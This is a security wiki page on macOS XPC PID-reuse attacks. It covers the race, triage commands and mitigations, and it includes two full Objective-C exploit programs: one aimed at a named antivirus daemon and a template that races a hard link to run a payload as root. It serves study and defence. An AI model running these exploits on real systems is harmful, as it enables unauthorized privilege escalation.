# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

When a macOS **XPC service** authenticates a caller by resolving its **PID** instead of using credentials bound to the received message, it may be vulnerable to a PID reuse attack. The practical primitive is not waiting for the PID namespace to wrap: the attacker sends an XPC request and immediately calls **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** with `POSIX_SPAWN_SETEXEC`, replacing the attacker's process image with an **allowed binary while retaining the PID**.<sup>[[1]](#references)[[2]](#references)</sup>

If the server dequeues the request and only then resolves that numeric PID to a live process for code-signing, entitlement, path, or parent-process checks, it observes the replacement binary instead of the process that sent the message. `POSIX_SPAWN_START_SUSPENDED` keeps the trusted replacement alive and stable while the server performs the check.<sup>[[1]](#references)[[2]](#references)</sup>

### What is actually raced

The vulnerable sequence is a **message-identity TOCTOU**, not simply “PIDs can repeat”:<sup>[[1]](#references)[[2]](#references)</sup>

1. An attacker process establishes or resumes an XPC connection and queues the privileged request.
2. Before the service converts the connection's PID into a `SecCodeRef` or another process object, the attacker overlays the same process with an approved executable using `POSIX_SPAWN_SETEXEC`.
3. The service validates the approved image currently attached to that PID, then dispatches the already queued attacker-controlled request.

Any PID bridge in an authorization data flow is suspicious: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid`, or `audit_token_to_pid` followed by `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)`, or a custom signature verifier. A PID used only for logging is not enough; confirm that it reaches the allow/deny decision. Also inspect error paths: trying an audit-token lookup first but **falling back to the PID on failure** restores the same race. This fallback pattern appeared in a 2026 analysis of Intego's privileged XPC services.<sup>[[3]](#references)</sup>

### Fast static and dynamic triage

Start from the connection handler and trace each PID-producing call into code-signing, entitlement, executable-path, or version checks. These commands provide a quick first pass over a candidate helper; stripped binaries still commonly expose imported symbols, Objective-C selectors, or diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```

During a controlled test, break or hook both the PID source and its verifier. A hit on `xpc_connection_get_pid` or `-processIdentifier` is only a lead; the useful evidence is a later lookup of the **same integer** after the request was received. Frida can additionally hook the application-specific verifier and privileged selector to measure whether the selector executes when the PID race wins.<sup>[[3]](#references)</sup>

### Exploit example

If you find the function **`shouldAcceptNewConnection`** or a function called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's **verifying the process PID** and not the audit token.\
Like for example in this image (taken from the reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Check this example exploit (again, taken from the reference) to see the 2 parts of the exploit:<sup>[[1]](#references)</sup>

- One that **generates several forks**
- **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.

> [!CAUTION]
> When racing with `fork()` from an Objective-C process, launch the exploit with `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` exported or embed the `__objc_fork_ok` marker:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
First option using **`NSTasks`** and argument to launch the children to exploit the RC

```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

    // send the XPC messages
    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
    xpcConnection.remoteObjectInterface = remoteInterface;

    [xpcConnection resume];
    [xpcConnection.remoteObjectProxy restartOS];

    char target_binary[] = BINARY;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSTask *processes[RACE_COUNT];

    for (int i = 0; i < RACE_COUNT; i++) {
        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
    }

    int i = 0;
    struct timespec ts = {
        .tv_sec = 0,
        .tv_nsec = 500 * 1000000,
    };

    nanosleep(&ts, NULL);
    if (++i > 4) {
        for (int i = 0; i < RACE_COUNT; i++) {
            [processes[i] terminate];
        }
        return false;
    }

    return true;
}

int main(int argc, const char * argv[]) {

    if(argc > 1) {
        // called from the NSTasks
        child();

    } else {
        NSLog(@"Starting the race");
        create_nstasks();
    }

    return 0;
}
```

{{#endtab}}

{{#tab name="fork"}}
This example uses a raw **`fork`** to launch **children that will exploit the PID race condition** and then exploit **another race condition via a Hard link:**

```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
 * Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
 * XPC service verify the legit binary and then execute as root out payload.
 */
void *check_race(void *arg) {
    while(!pwned) {
        // Overwrite with contents of the legit binary
        system("cat ./legit_bin > hard_link");
        usleep(50000);

        // Overwrite with contents of the payload to execute
        // TODO: COMPILE YOUR OWN PAYLOAD BIN
        system("cat ./payload > hard_link");
        usleep(50000);
    }
    return NULL;
}

void child_xpc_pid_rc_abuse(){
    // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
    #define kValid "./Legit Updater.app/Contents/MacOS/Legit"
    extern char **environ;

    // Connect with XPC service
    // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
    NSString*  service_name = @"com.example.Helper";
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
    // TODO: CNAGE THE PROTOCOL NAME
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
    [connection setRemoteObjectInterface:interface];
    [connection resume];

    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"[-] Something went wrong");
        NSLog(@"[-] Error: %@", error);
    }];

    NSLog(@"obj: %@", obj);
    NSLog(@"conn: %@", connection);

    // Call vulenrable XPC function
    // TODO: CHANGE NAME OF FUNCTION TO CALL
    [obj DoSomething:^(_Bool b){
        NSLog(@"Response, %hdd", b);
    }];

    // Change current process to the legit binary suspended
    char target_binary[] = kValid;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
 * Function to perform the PID race condition using children calling the XPC exploit.
 */
void xpc_pid_rc_abuse() {
    #define RACE_COUNT 1
    extern char **environ;
    int pids[RACE_COUNT];

    // Fork child processes to exploit
    for (int i = 0; i < RACE_COUNT; i++) {
        int pid = fork();
        if (pid == 0) {  // If a child process
            child_xpc_pid_rc_abuse();
        }
        printf("forked %d\n", pid);
        pids[i] = pid;
    }

    // Wait for children to finish their tasks
    sleep(3);

    // Terminate child processes
    for (int i = 0; i < RACE_COUNT; i++) {
        if (pids[i]) {
            kill(pids[i], 9);
        }
    }
}

int main(int argc, const char * argv[]) {
    // Create and set execution rights to 'hard_link' file
    system("touch hard_link");
    system("chmod +x hard_link");

    // Create thread to exploit sign verification RC
    pthread_t thread;
    pthread_create(&thread, NULL, check_race, NULL);

    while(!pwned) {
        // Try creating 'download' directory, ignore errors
        system("mkdir download 2>/dev/null");

        // Create a hardlink
        // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
        system("ln hard_link download/legit_bin");

        xpc_pid_rc_abuse();
        usleep(10000);

        // The payload will generate this file if exploitation is successful
        if (access("/tmp/pwned", F_OK ) == 0) {
            pwned = true;
        }
    }

    return 0;
}
```

{{#endtab}}
{{#endtabs}}

## Making the race reproducible

The following tuning points recur across working PID-reuse exploits and recent privileged-helper testing:<sup>[[1]](#references)[[3]](#references)</sup>

- Send the request and call `posix_spawn` immediately; do **not** wait for the reply. The request must already be queued while the server's PID lookup happens after the image replacement.
- Keep `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` together. The first flag preserves the racing process's PID; the second prevents the valid target from exiting or changing state before validation.
- Use several short-lived racers and retry the complete connection/request/exec sequence. The optimal count is target-dependent; excessive children can slow the service and make the window worse.
- The replacement must satisfy the server's **entire** requirement. Reuse the legitimate client binary when possible and check its designated requirement first with `codesign -d -r- "/path/to/client.app"`.
- First invoke a harmless exported selector or a read-only method. This separates winning authentication from successfully exploiting a later privileged primitive.

## Avoiding the PID bridge

On macOS 13+, Foundation exposes `-[NSXPCConnection setCodeSigningRequirement:]`. Set the peer requirement exactly once and **before** `resume`; malformed requirement strings raise an exception (or a Swift fatal error), and a message from a peer that does not satisfy the requirement invalidates the connection. This lets XPC enforce the peer's code identity without application code resolving a PID.<sup>[[6]](#references)</sup>

```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
    @try {
        NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
                         @"and certificate leaf[subject.OU] = \"TEAMID\"";
        [c setCodeSigningRequirement:req];
    } @catch (NSException *e) {
        return NO;
    }
    c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
    c.exportedObject = self;
    [c resume];
    return YES;
}
```

For the modern low-level listener API on macOS 26+, `xpc_listener_set_peer_requirement` applies a validated `xpc_peer_requirement_t` while the listener is inactive. XPC drops requests that do not meet it; peer sessions created from the listener do **not** inherit it, so apply an appropriate session requirement as well when those sessions authorize privileged operations.<sup>[[7]](#references)</sup>

> [!WARNING]
> Do not “fix” this by copying an audit token and then converting it back to a PID for the actual `SecCode` lookup. Keep the audit-token-derived identity through the authorization decision, or use an XPC peer-requirement API end to end.<sup>[[2]](#references)[[6]](#references)</sup> The connection-wide audit-token APIs also have a distinct race class, covered in [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Other examples

- [**Intego X9: Why your macOS antivirus should not trust PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE against an AV's privileged helper that authenticated clients by PID.<sup>[[3]](#references)</sup>
- [**Exploiting GOG Galaxy XPC service for privilege escalation in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Learn XPC exploitation - Part 2: Say no to the PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Don't Trust the PID! Stories of a simple logic bug and where to find it - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Why your macOS antivirus should not trust PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Exploiting GOG Galaxy XPC service for privilege escalation in macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)

{{#include ../../../../../../banners/hacktricks-training.md}}
